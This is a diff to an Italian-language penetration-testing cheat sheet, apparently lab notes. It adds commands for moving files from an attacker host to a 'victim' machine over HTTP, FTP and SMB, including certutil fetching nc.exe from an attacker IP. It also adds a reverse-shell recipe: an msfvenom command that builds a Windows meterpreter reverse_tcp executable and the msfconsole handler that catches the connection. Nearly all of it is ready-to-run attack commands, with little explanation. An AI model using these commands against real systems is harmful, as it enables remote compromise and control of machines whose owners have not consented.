@@ -2,18 +2,66 @@
 
 ## file transfer
 
+### HTTP
+host: 
+```
+python -m http.server 9000
+```
+
+vittima:
+```
+wget http://10.10.14.14:9000/file -o .
+```
+o con
+```
+certutil -urlcache -f http://10.10.14.23/nc.exe nc.exe
+```
+
+### FTP
+host:
+```
+python -m pyftpdlib -p 21
+```
+
+vittima:
+```
+ftp 10.10.14.14
+```
+
+### SMB
+host:
+```
+impacket-smbserver ciao .
+```
+
+vittima:
+```
+copy \\10.10.14.14\ciao\file.exe .
+```
+
 https://blog.ropnop.com/transferring-files-from-kali-to-windows/
 
 
 ## reverse shell 
 
 ### meterpreter
- https://johndcyber.com/how-to-create-a-reverse-tcp-shell-windows-executable-using-metasploit-56d049007047
+host: creare reverse shell
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.103 LPORT=4444 -f exe -o /home/kali/Desktop/rs_exploitl.exe
+```
 
-### certutil
+vittima: eseguire la shell 
+host:
 ```
-certutil -urlcache -f http://10.10.14.23/nc.exe nc.exe
+msfconsole
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.10.14.14
+set LPORT 4444
+exploit
 ```
+
+ https://johndcyber.com/how-to-create-a-reverse-tcp-shell-windows-executable-using-metasploit-56d049007047
 
 ### nishang 
 
